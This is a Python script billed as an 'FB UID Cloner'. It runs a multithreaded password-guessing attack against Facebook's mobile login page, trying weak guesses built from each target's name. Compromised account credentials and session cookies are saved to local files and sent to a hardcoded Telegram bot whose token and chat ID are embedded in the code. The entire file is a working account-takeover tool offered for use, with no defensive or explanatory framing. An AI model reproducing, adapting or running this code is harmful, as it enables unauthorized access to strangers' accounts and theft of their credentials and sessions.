#!/usr/bin/env python3
import os, sys, time, random, mechanize, requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

# Telegram Config
bot_token = "7916067646:AAHLwaaZrzgVeqrV3oLXJnSTCa8xOfizzQU"
chat_id = "5672808863"

# Files
ok_file = "OK.txt"
cp_file = "CP.txt"
cookie_file = "OK-cookie.txt"

# User-Agent List
user_agents = [
    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
]

# Mechanize Setup
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [("User-Agent", random.choice(user_agents))]

oks = []
cps = []

def telegram_alert(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", data={
            "chat_id": chat_id,
            "text": msg
        })
    except:
        pass

def banner():
    os.system("clear")
    print(f"""
\033[1;32m
  ______         _               _  
 |  ____|       | |             | | 
 | |__ ___  _ __| |__   __ _  __| | 
 |  __/ _ \\| '__| '_ \\ / _` |/ _` | 
 | | | (_) | |  | | | | (_| | (_| | 
 |_|  \\___/|_|  |_| |_|\\__,_|\\__,_| 

\033[1;37m------------------------------------------------
\033[1;36m Owner   : Forhad Hasan
 Github   : https://github.com/Forhadj
 Tool     : FB UID Cloner (Real)
 Version  : 1.0
\033[1;37m------------------------------------------------
""")

def login(uid, name, pwx):
    global oks, cps
    sys.stdout.write(f"\r[•] Cracking {uid}... OK: {len(oks)} CP: {len(cps)}")
    sys.stdout.flush()
    for pw in pwx:
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": random.choice(user_agents)})
            res = session.get("https://mbasic.facebook.com")
            bs = BeautifulSoup(res.text, "html.parser")
            lsd = bs.find("input", {"name":"lsd"}).get("value")
            jazoest = bs.find("input", {"name":"jazoest"}).get("value")
            data = {
                "lsd": lsd,
                "jazoest": jazoest,
                "email": uid,
                "pass": pw,
                "login": "Log In"
            }
            response = session.post("https://mbasic.facebook.com/login.php", data=data, allow_redirects=True)
            if "c_user" in session.cookies.get_dict():
                cookie = "; ".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                msg = f"🔥 OK: {uid} | {pw}\n🍪 Cookie: {cookie}"
                print(f"\n\033[1;32m[OK] {uid} | {pw}")
                with open(ok_file, "a") as okf: okf.write(f"{uid}|{pw}\n")
                with open(cookie_file, "a") as cf: cf.write(f"{uid}|{pw}|{cookie}\n")
                telegram_alert(msg)
                oks.append(uid)
                break
            elif "checkpoint" in session.cookies.get_dict():
                print(f"\n\033[1;33m[CP] {uid} | {pw}")
                with open(cp_file, "a") as cpf: cpf.write(f"{uid}|{pw}\n")
                telegram_alert(f"⚠️ CP: {uid} | {pw}")
                cps.append(uid)
                break
        except:
            pass

def start_crack():
    banner()
    file = input("[•] Enter UID file name (e.g. ids.txt): ")
    try:
        uid_list = open(file).read().splitlines()
    except FileNotFoundError:
        print("[!] File not found")
        return

    pw_input = input("[•] Enter passwords (comma separated or leave empty for auto): ")
    print(f"[✓] Total IDs loaded: {len(uid_list)}")
    print("[✓] Cracking started...\n")

    with ThreadPoolExecutor(max_workers=20) as ex:
        for line in uid_list:
            try:
                uid, name = line.split("|")
                name = name.lower()
                if pw_input:
                    pwx = [x.strip() for x in pw_input.split(",")]
                else:
                    pwx = [name+"123", name+"1234", "123456", "bangladesh", name+"2024"]
                ex.submit(login, uid, name, pwx)
            except:
                continue

    print("\n[✓] Process complete")
    print(f"[✓] Total OK: {len(oks)}")
    print(f"[✓] Total CP: {len(cps)}")
    input("[•] Press Enter to return to menu...")

def menu():
    while True:
        banner()
        print("[1] Start Cloning")
        print("[0] Exit")
        ch = input("\n[•] Choose: ")
        if ch == "1":
            start_crack()
        elif ch == "0":
            exit()
        else:
            print("[!] Invalid option")
            time.sleep(1)

if __name__ == "__main__":
    menu()
